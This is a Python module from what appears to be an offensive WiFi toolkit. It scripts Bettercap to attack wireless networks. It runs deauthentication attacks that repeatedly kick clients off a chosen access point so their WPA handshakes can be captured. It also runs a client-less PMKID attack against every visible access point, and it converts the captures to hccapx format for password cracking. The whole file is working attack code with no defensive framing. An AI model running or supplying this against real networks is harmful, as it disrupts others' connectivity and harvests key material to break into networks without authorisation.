import json
import subprocess
import os
import time
import signal

from spartan import scan
from spartan import crack
from spartan.utils import post, get, delete_events

API_COOLDOWN = 5

# Print information regarding the captured handshake
def get_handshake_info(handshake_file):
    handshake_json = []

    events = get('events')

    for event in json.loads(events.text):
        if event['tag'] == 'wifi.client.handshake':
            handshake_json.append(event['data'])


    # Print information about the generated capture
    if handshake_json:
        print('\n' + handshake_file + ' capture summary:')
        for handshake in handshake_json:
            if handshake_file == handshake['file'].split('/')[-1]:
                if (handshake['full']):
                    print('Captured full handshake of client ' + handshake['station'])
                elif (handshake['half']):
                    print('Captured half handshake of client ' + handshake['station'])

    delete_events()

# Launch a WiFi deauthentication attack in order to capture handshackes
def deauth_attack(bssid):
    # Generate an unique handshake file name and set the path to be stored
    handshake_file = './key_material/ ' + str(bssid) + '_' + time.strftime("%Y%m%d%H%M%S", time.gmtime()) + '.pcap'
    delete_events()
    post('set wifi.handshakes.file ' + handshake_file)

    print('Launching a deauthentication attack against: ' + str(bssid))

    attempts = 0
    max_attempts = 10
    while not(os.path.isfile(handshake_file) or attempts > max_attempts):
        print('Access point clients are being deauthenticated...')
        post('wifi.deauth ' + bssid)
        attempts += 1
        time.sleep(API_COOLDOWN)

    # Check if the captured .pcap is valid
    time.sleep(API_COOLDOWN)
    if(os.path.isfile(handshake_file)):
        if(crack.pcap_to_hccapx(handshake_file)):
            print('Handshake of ' + str(bssid) + ' captured successfully.')
            get_handshake_info(handshake_file.split('/')[-1])

        # Captured file does not have enough data
        else:
            print('No handshake has been captured with success.')
    elif attempts > max_attempts:
        print('Maximum number of attempts reached, no handshake has been captured with success.')

# Check if the given BSSID exists and if it has clients
def check_bssid(bssid):
    aps_json = scan.request_aps()

    # Iterate through all the access points searching for the given BSSID
    bssid_exists = False
    for ap in aps_json:
        if ap['mac'] == bssid:
            bssid_exists = True
            if len(ap['clients']) > 0:
                print('\nBSSID exists and has clients connected.')
                return True
            else:
                print('\nBSSID exists but does not have any client connected at the moment.')
                return False
    if not bssid_exists:
        print('\nBSSID does not exist.')
        exit()

# PMKID client-less attack vector
def pmkid_attack():
    print('\nLaunching a PMKID client-less attack to all visible access points.')

    # Generate a new .pcap file if new PMKID keys are retrieved
    pmkid_file = './key_material/pmkid_keys_' + time.strftime("%Y%m%d%H%M%S", time.gmtime()) + '.pcap'
    post('set wifi.handshakes.file ' + pmkid_file)

    post('wifi.recon on')
    post('wifi.assoc all')
    time.sleep(API_COOLDOWN*2) # Time needed to associate all APs

    if(os.path.isfile(pmkid_file)):
        if(crack.pcap_to_hccapx(pmkid_file)):
            print('PMKID keys captured: ' + pmkid_file.split('/')[-1])
            #exit()
        else:
            print('No PMKID key were captured. Not all access points are vulnerable to this attack.')
            #exit()
    if not(os.path.isfile(pmkid_file)):
        print('No PMKID key were captured. Not all access points are vulnerable to this attack.')
        #exit()

# Start capturing key material given a BSSID
def start_deauth(args):
    #Deploy the Bettercap API
    bettercap = subprocess.Popen(['bettercap', '-caplet', 'http-ui'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    time.sleep(API_COOLDOWN) # Time needed to start requesting data without errors

    try:
        has_clients = check_bssid(args.bssid)

        # Start a WiFi deauthentication attack
        if has_clients:
            deauth_attack(args.bssid)

        else:
            print('To deauthenticate an access point we need clients.')
            exit()

    except Exception as e:
        print(e)

    # Stop the Bettercap API
    finally:
        try:
            os.killpg(os.getpgid(bettercap.pid), signal.SIGTERM)
        except ProcessLookupError:
            exit()

# Start a PMKID client-less attack to all access points
def start_assoc(args):
    #Deploy the Bettercap API
    bettercap = subprocess.Popen(['bettercap', '-caplet', 'http-ui'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    time.sleep(API_COOLDOWN) # Time needed to start requesting data without errors

    try:
        pmkid_attack()

    except Exception as e:
        print(e)

    # Stop the Bettercap API
    finally:
        try:
            os.killpg(os.getpgid(bettercap.pid), signal.SIGTERM)
        except ProcessLookupError:
            exit()
